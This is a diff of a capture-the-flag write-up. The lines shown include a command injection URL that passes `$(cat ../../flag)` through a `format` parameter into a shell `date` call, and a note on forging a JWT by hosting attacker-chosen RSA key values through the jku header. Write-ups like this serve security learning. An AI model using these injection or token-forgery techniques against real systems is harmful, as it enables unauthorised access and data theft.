@@ -57,7 +57,7 @@ class TimeModel
     }
 }
 ```
-So the `$_GET['format']` will be executed as `date '$format' 2>&1`
+So the `$_GET['format']` will be executed as `date '$format' 2>&1`  
 Command Injection:
 ```
 http://host/?format=%Y-%m-%d-%27;$(cat%20../../flag)%27
@@ -112,5 +112,6 @@ fp.close()
 print "n:", int(key.n)
 print "e:", int(key.e)
 ```
+Update `e` and `n` in jku, after that host that file.
 That is all, copy the jwt token and replace in cookie.
 ![Emergency Solved](img/emergency_solved.png)
